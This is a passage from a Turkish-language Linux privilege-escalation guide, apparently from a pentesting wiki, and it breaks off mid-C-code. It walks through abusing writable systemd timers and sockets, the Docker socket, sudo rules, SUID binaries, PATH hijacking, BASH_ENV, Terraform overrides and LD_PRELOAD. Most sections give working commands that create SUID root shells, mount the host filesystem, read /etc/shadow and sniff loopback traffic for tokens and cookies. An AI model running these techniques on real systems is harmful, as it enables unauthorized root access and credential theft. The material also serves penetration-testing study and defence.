**Hizmetler hakkında daha fazla bilgi için `man systemd.service` komutuna bakın.**

## **Timers**

**Timers**, adı `**.timer**` ile biten ve `**.service**` dosyalarını veya olayları kontrol eden systemd unit dosyalarıdır. **Timers**, calendar time events ve monotonic time events için yerleşik desteğe sahip oldukları ve asenkron olarak çalıştırılabildikleri için cron'a bir alternatif olarak kullanılabilir.

Tüm timer'ları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir timerler

Eğer bir timer'ı değiştirebiliyorsanız, systemd.unit içindeki bazı mevcut birimleri (ör. `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
Dokümantasyonda Unit'in ne olduğu şöyle açıklanıyor:

> Bu timer sona erdiğinde etkinleştirilecek unit. Argüman bir unit adı olup, soneki ".timer" değildir. Belirtilmezse, bu değer varsayılan olarak timer unit ile aynı ada sahip, yalnızca sonek farklı olan bir service olur. (Yukarıya bakınız.) Etkinleştirilen unit adı ile timer unit adının, sonek dışında, aynı isimde olması tavsiye edilir.

Bu nedenle, bu izni suistimal etmek için şunlara ihtiyacınız olacak:

- Bir systemd unit (ör. `.service`) bulun; bu unit **yazılabilir bir binary çalıştırıyor**
- Bir systemd unit bulun; bu unit **göreli bir yol çalıştırıyor** ve sizin **systemd PATH** üzerinde **yazma ayrıcalıklarınız** var (o yürütülebilir dosyayı taklit etmek için)

**Daha fazla bilgi için `man systemd.timer`'a bakın.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Not: **timer** `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` yolunda ona bir symlink oluşturarak **etkinleştirilir**.

## Soketler

Unix Domain Sockets (UDS), client-server modellerinde aynı veya farklı makineler arasında **process communication** sağlar. AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 adresi ve/veya port numarası vb. gibi inter-bilgisayar iletişimi için standart Unix descriptor dosyalarını kullanırlar ve `.socket` dosyalarıyla yapılandırılır.

Sockets `.socket` dosyaları kullanılarak yapılandırılabilir.

**Learn more about sockets with `man systemd.socket`.** Bu dosya içinde birkaç ilginç parametre yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ama özet olarak **nerede dinleyeceğini belirtir** (AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası vb.)
- `Accept`: Boolean bir argüman alır. Eğer **true** ise, **her gelen bağlantı için bir service instance başlatılır** ve sadece bağlantı soketi ona geçirilir. Eğer **false** ise, tüm dinleme soketleri **başlatılan service unit'a geçirilir** ve tüm bağlantılar için yalnızca bir service unit başlatılır. Bu değer datagram soketleri ve FIFOs için yok sayılır; bu türlerde tek bir service unit koşulsuz olarak tüm gelen trafiği işler. **Defaults to false**. Performans nedenleriyle, yeni daemon'ların yalnızca `Accept=no` için uygun olacak şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bunlar dinleme **sockets**/FIFO'lar **oluşturulmadan** ve bağlanmadan **önce** veya **sonra** çalıştırılır. Komut satırının ilk token'ı mutlak bir dosya adı olmalıdır, ardından işlem için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinleme **sockets**/FIFO'lar **kapatılmadan** ve kaldırılmadan önce veya sonra çalıştırılan ek **komutlar**.
- `Service`: Gelen trafikte **aktive edilecek** service unit adını belirtir. Bu ayar yalnızca Accept=no olan soketler için izinlidir. Varsayılan olarak soketle aynı ada sahip olan service (sonek değiştirilmiş) kullanılır. Çoğu durumda bu seçeneği kullanmak gerekli olmamalıdır.

### Yazılabilir .socket dosyaları

Eğer bir **writable** `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir şey **add** edebilirsiniz ve backdoor soket oluşturulmadan önce çalıştırılacaktır. Bu nedenle, **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecektir.**\
_Not that the system must be using that socket file configuration or the backdoor won't be executed_

### Socket activation + writable unit path (create missing service)

Başka yüksek etkili bir yanlış yapılandırma:

- `Accept=no` olan ve `Service=<name>.service` içeren bir socket unit
- referans verilen service unit eksik
- bir saldırgan `/etc/systemd/system` (veya başka bir unit arama yolu) içine yazabilir

Bu durumda, saldırgan `<name>.service` oluşturabilir, sonra sokete trafik tetikleyerek systemd'nin yeni servisi root olarak yükleyip çalıştırmasını sağlayabilir.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Writable sockets

Eğer herhangi bir **writable socket** tespit ederseniz (_şu anda Unix Sockets'tan bahsediyoruz, config `.socket` dosyalarından değil_), bu socket ile **iletişim kurabilir** ve belki bir güvenlik açığından faydalanabilirsiniz.

### Unix Sockets'i Listeleme
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Bazı **sockets listening for HTTP** istekleri olabilir (_.socket dosyalarından değil, unix sockets olarak davranan dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Eğer socket bir **HTTP isteğine yanıt veriyorsa**, onunla **iletişim kurabilir** ve belki bazı **güvenlik açıklarını exploit edebilirsiniz**.

### Yazılabilir Docker Socket

Docker socket, genellikle `/var/run/docker.sock` konumunda bulunan, güvence altına alınması gereken kritik bir dosyadır. Varsayılan olarak, `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir durumdadır. Bu socket'e yazma erişimine sahip olmak privilege escalation'a yol açabilir. Aşağıda bunun nasıl yapılabileceğinin bir dökümü ve Docker CLI mevcut değilse alternatif yöntemler yer almaktadır.

#### **Privilege Escalation with Docker CLI**

Eğer Docker socket'e yazma erişiminiz varsa, aşağıdaki komutları kullanarak privilege escalation gerçekleştirebilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host'un dosya sistemine root seviyesinde erişimle bir container çalıştırmanızı sağlar.

#### **Using Docker API Directly**

Docker CLI kullanılamıyorsa, Docker soketi yine Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Kullanılabilir images listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Host sisteminin root dizinini mount eden bir container oluşturmak için istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Container'a bağlanmak için `socat` kullanın; bu, içinde komut çalıştırmanızı sağlar.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, host'un dosya sistemine root seviyesinde erişimle container içinde doğrudan komut çalıştırabilirsiniz.

### Diğerleri

Unutmayın, docker soketi üzerinde yazma izinleriniz varsa—çünkü **`docker` grubunun içindeyseniz**—[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) erişiminiz olur. Eğer [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) durumundaysa, onu da ele geçirebilirsiniz.

Konteynerlerden kaçmanın veya container runtimes'ı kötüye kullanarak ayrıcalıkları yükseltmenin daha fazla yolunu şu yerde kontrol edin:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) ayrıcalık yükseltme

Eğer **`ctr`** komutunu kullanabildiğinizi tespit ederseniz, aşağıdaki sayfayı okuyun çünkü **bunu ayrıcalıkları yükseltmek için kötüye kullanabiliyor olabilirsiniz**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** ayrıcalık yükseltme

Eğer **`runc`** komutunu kullanabildiğinizi tespit ederseniz, aşağıdaki sayfayı okuyun çünkü **bunu ayrıcalıkları yükseltmek için kötüye kullanabiliyor olabilirsiniz**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli şekilde etkileşimde bulunmasını ve veri paylaşmasını sağlayan gelişmiş bir işlemler-arası iletişim (IPC) sistemidir. Modern Linux sistemi düşünülerek tasarlanmış olup, farklı uygulama iletişim biçimleri için sağlam bir çerçeve sunar.

Sistem, işlemler arası veri alışverişini geliştiren temel IPC'yi destekleyerek esneklik sağlar; bu durum geliştirilmiş UNIX domain soketlerini anımsatır. Ayrıca olay veya sinyal yayınına yardımcı olarak sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemon'undan gelen gelen arama bildirimi, bir müzik çaların sessize alınmasını tetikleyebilir ve kullanıcı deneyimini iyileştirir. D-Bus ayrıca uzak nesne sistemi desteği sunar; bu, uygulamalar arasında servis istekleri ve method çağrılarını basitleştirerek geleneksel olarak karmaşık olan süreçleri kolaylaştırır.

D-Bus, eşleşen politika kurallarının kümülatif etkisine göre mesaj izinlerini (method çağrıları, sinyal yayımı vb.) yöneten bir **izin/verme modeli** üzerinde çalışır. Bu politikalar bus ile etkileşimleri belirtir ve bu izinlerin kötüye kullanılması yoluyla ayrıcalık yükseltmeye izin verebilir.

Böyle bir politika örneği `/etc/dbus-1/system.d/wpa_supplicant.conf` içinde verilmiştir; root kullanıcısının `fi.w1.wpa_supplicant1`'e sahip olma, ona gönderme ve ondan mesaj alma izinlerini ayrıntılandırır.

Belirli bir kullanıcı veya grup belirtilmemiş politikalar evrensel olarak uygulanır; öte yandan "default" bağlam politikaları, diğer özel politikaların kapsamadığı herkese uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini enumerate etmek ve exploit etmek için buraya bakın:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin pozisyonunu tespit etmek her zaman ilginçtir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Giden filtreleme: hızlı ön değerlendirme

Eğer host komut çalıştırabiliyor ancak callbacks başarısız oluyorsa, DNS, transport, proxy ve route filtrelemelerini hızlıca ayırın:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Açık portlar

Erişim sağlamadan önce daha önce etkileşim kuramadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Dinleyicileri bind hedeflerine göre sınıflandırın:

- `0.0.0.0` / `[::]`: tüm yerel arayüzlerde erişilebilir.
- `127.0.0.1` / `::1`: sadece yerel (tunnel/forward için iyi adaylar).
- Belirli dahili IP'ler (ör. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): genellikle yalnızca dahili segmentlerden ulaşılabilir.

### Yalnızca yerel hizmet triage iş akışı

Bir host'u ele geçirdiğinizde, `127.0.0.1`'e bağlı hizmetler genellikle shell'inizden ilk kez erişilebilir hale gelir. Hızlı bir yerel iş akışı:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS bir ağ tarayıcısı olarak (network-only mode)

Yerel PE kontrollerinin yanı sıra, linPEAS odaklanmış bir ağ tarayıcısı olarak çalıştırılabilir. `$PATH` içinde bulunan ikili dosyaları kullanır (genellikle `fping`, `ping`, `nc`, `ncat`) ve araç yüklemez.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Eğer `-d`, `-p` veya `-i` seçeneklerini `-t` olmadan verirseniz, linPEAS saf bir network scanner olarak davranır (skipping the rest of privilege-escalation checks).

### Sniffing

Trafiği sniff edip edemeyeceğinizi kontrol edin. Eğer yapabiliyorsanız, bazı kimlik bilgilerini yakalayabilirsiniz.
```
timeout 1 tcpdump
```
Hızlı pratik kontroller:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) post-exploitation sırasında özellikle değerlidir çünkü birçok yalnızca dahili hizmet orada tokens/cookies/credentials açığa çıkarır:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Şimdi capture et, sonra parse et:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Kullanıcılar

### Generic Enumeration

Kontrol edin **who** olduğunuzu, hangi **privileges**'a sahip olduğunuzu, sistemde hangi **users**'ın olduğunu, hangilerinin **login** yapabildiğini ve hangilerinin **root privileges**'a sahip olduğunu:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Büyük UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalıkları yükseltmesine izin veren bir hatadan etkileniyordu. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruplar

Root ayrıcalıkları verebilecek herhangi bir grubun **üyesi** olup olmadığınızı kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Pano içinde ilginç bir şey olup olmadığını kontrol edin (mümkünse)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen passwords

Eğer ortamın herhangi bir **password**'ünü biliyorsanız **her kullanıcıya bu password ile giriş yapmayı deneyin**.

### Su Brute

Eğer yüksek gürültü çıkarmayı umursamıyorsanız ve `su` ile `timeout` binary'leri bilgisayarda mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıyı brute-force etmeyi deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresiyle aynı zamanda kullanıcıları brute-force etmeyi dener.

## Yazılabilir PATH istismarları

### $PATH

Eğer $PATH içindeki bir klasöre **yazabiliyorsanız** yetkileri, farklı bir kullanıcı (ideali root) tarafından çalıştırılacak bir komutun adıyla yazılabilir klasörün içinde **bir backdoor oluşturarak** yükseltebilirsiniz; bunun için komutun $PATH'te sizin yazılabilir klasörünüzden **önce bulunan** bir klasörden yüklenmemesi gerekir.

### SUDO and SUID

Bazı komutları sudo kullanarak çalıştırma izniniz olabilir veya dosyalar suid bitine sahip olabilir. Bunu kontrol etmek için:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosyaları okumaya ve/veya yazmaya veya hatta bir komut çalıştırmaya izin verir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının şifreyi bilmeden başka bir kullanıcının ayrıcalıklarıyla bir komutu çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo` `vim`'i `root` olarak çalıştırabiliyor; artık root directory'ye bir ssh key ekleyerek veya `sh` çağırarak kolayca bir shell elde etmek mümkün.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, kullanıcının bir şeyi çalıştırırken **bir ortam değişkeni ayarlamasına** izin verir:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer tabanlı**, script root olarak çalıştırılırken keyfi bir python kütüphanesini yüklemek için **PYTHONPATH hijacking**'e karşı **zayıftı**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Neden işe yarar: Etkileşimsiz shell'ler için, Bash `$BASH_ENV`'i değerlendirir ve hedef script'i çalıştırmadan önce o dosyayı source eder. Birçok sudo kuralı bir script veya bir shell wrapper'ını çalıştırmaya izin verir. Eğer `BASH_ENV` sudo tarafından korunuyorsa, dosyanız root ayrıcalıklarıyla source edilir.

- Gereksinimler:
- Çalıştırabileceğiniz bir sudo kuralı (etkileşimsiz olarak `/bin/bash`'i çağıran herhangi bir hedef ya da herhangi bir bash script).
- `BASH_ENV`'in `env_keep` içinde olması (`sudo -l` ile kontrol edin).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Sertleştirme:
- `env_keep`'ten `BASH_ENV` (ve `ENV`) öğesini kaldırın, `env_reset` tercih edin.
- sudo-allowed commands için shell wrappers'tan kaçının; minimal binaries kullanın.
- preserved env vars kullanıldığında sudo I/O logging ve alerting'i düşünün.

### Terraform: sudo ile korunmuş HOME (!env_reset)

Eğer sudo ortamı olduğu gibi bırakır (`!env_reset`) ve `terraform apply`'e izin veriyorsa, `$HOME` çağıran kullanıcıya ait olarak kalır. Bu durumda Terraform root olarak **$HOME/.terraformrc** dosyasını yükler ve `provider_installation.dev_overrides`'u dikkate alır.

- Gerekli provider'ı yazılabilir bir dizine yönlendirin ve provider adıyla aynı olan kötü amaçlı bir plugin bırakın (örn. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform, Go plugin handshake'ini başarısız kılar; ancak ölmeden önce payload'u root olarak çalıştırır ve geride bir SUID shell bırakır.

### TF_VAR overrides + symlink validation bypass

Terraform değişkenleri `TF_VAR_<name>` ortam değişkenleri aracılığıyla sağlanabilir; sudo ortamı koruduğunda bu değişkenler korunur. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` gibi zayıf doğrulamalar symlinks ile atlatılabilir:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform symlink'i çözer ve gerçek `/root/root.txt` dosyasını saldırganın okuyabileceği bir hedefe kopyalar. Aynı yaklaşım, hedef symlink'leri önceden oluşturarak ayrıcalıklı yollara **yazmak** için de kullanılabilir (ör. provider’ın hedef yolunu `/etc/cron.d/` içine işaret edecek şekilde).

### requiretty / !requiretty

Bazı eski dağıtımlarda sudo `requiretty` ile yapılandırılabilir; bu, sudo'nun yalnızca etkileşimli bir TTY'den çalışmasını zorunlu kılar. Eğer `!requiretty` ayarlanmışsa (ya da seçenek yoksa), sudo reverse shells, cron jobs veya scripts gibi etkileşimsiz bağlamlardan çalıştırılabilir.
```bash
Defaults !requiretty
```
Bu tek başına doğrudan bir güvenlik açığı değildir, ancak sudo kurallarının tam bir PTY gerektirmeden kötüye kullanılabileceği durumları genişletir.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.

- Gereksinimler: komutları mutlak yollarla çağırmayan (`free`, `df`, `ps`, vb.) bir script/binary çalıştıran bir sudo kuralı (çoğunlukla `NOPASSWD`) ve öncelikle aranan yazılabilir bir PATH girdisi.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo yürütmeyi atlatma yolları
**Jump** ile diğer dosyaları okuyun veya **symlinks** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılmışsa (\*), bu daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Eğer **sudo permission** tek bir komuta **without specifying the path** olarak verilmişse: _hacker10 ALL= (root) less_, PATH variable'ını değiştirerek bunu exploit edebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** ikili **başka bir komutu yolunu belirtmeden çalıştırıyorsa (garip bir SUID ikilisinin içeriğini her zaman** _**strings**_ **ile kontrol edin)** durumunda da kullanılabilir.

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu belirtilmiş SUID binary

Eğer **suid** binary **komutun yolunu belirterek başka bir komut çalıştırıyorsa**, suid dosyasının çağırdığı komutun adıyla bir fonksiyon oluşturup **export a function** etmeyi deneyebilirsiniz.

Örneğin, eğer bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, çağrılan komut adıyla bir fonksiyon oluşturup export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonra, suid ikiliyi çağırdığınızda bu fonksiyon çalıştırılacaktır

### SUID wrapper tarafından yürütülen yazılabilir script

Yaygın bir custom-app yanlış yapılandırması, bir script çalıştıran root-owned SUID binary wrapper olmasıdır; ancak scriptin kendisi low-priv users tarafından yazılabilir durumda olur.

Tipik desen:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Eğer `/usr/local/bin/backup.sh` yazılabilir durumdaysa, payload komutlarını ekleyip ardından SUID wrapper'ı çalıştırabilirsiniz:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Hızlı kontroller:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Bu saldırı yolu, özellikle `/usr/local/bin` içine yerleştirilen "maintenance"/"backup" wrappers içinde sık görülür.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** ortam değişkeni, yükleyici tarafından diğer tüm kütüphanelerden (standart C kütüphanesi (`libc.so`) dahil) önce yüklenmesi için bir veya daha fazla shared library (.so files) belirtmek için kullanılır. Bu işleme kütüphane önyükleme denir.

Ancak sistem güvenliğini korumak ve özellikle **suid/sgid** çalıştırılabilir dosyalarının bu özellik üzerinden kötüye kullanılmasını engellemek için sistem bazı koşullar uygular:

- Yükleyici, gerçek kullanıcı kimliği (_ruid_) ile etkin kullanıcı kimliği (_euid_) eşleşmeyen çalıştırılabilir dosyalar için **LD_PRELOAD**'i yok sayar.
- suid/sgid olan çalıştırılabilir dosyalar için yalnızca standart yollar içindeki ve kendileri de suid/sgid olan kütüphaneler preload edilir.

Eğer `sudo` ile komut çalıştırma yeteneğiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa, yetki yükseltmesi meydana gelebilir. Bu yapılandırma, `sudo` ile komutlar çalıştırıldığında bile **LD_PRELOAD** ortam değişkeninin korunmasına ve tanınmasına izin verir; bu da muhtemelen yükseltilmiş ayrıcalıklarla rastgele kod çalıştırılmasına yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Şu adla kaydedin: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
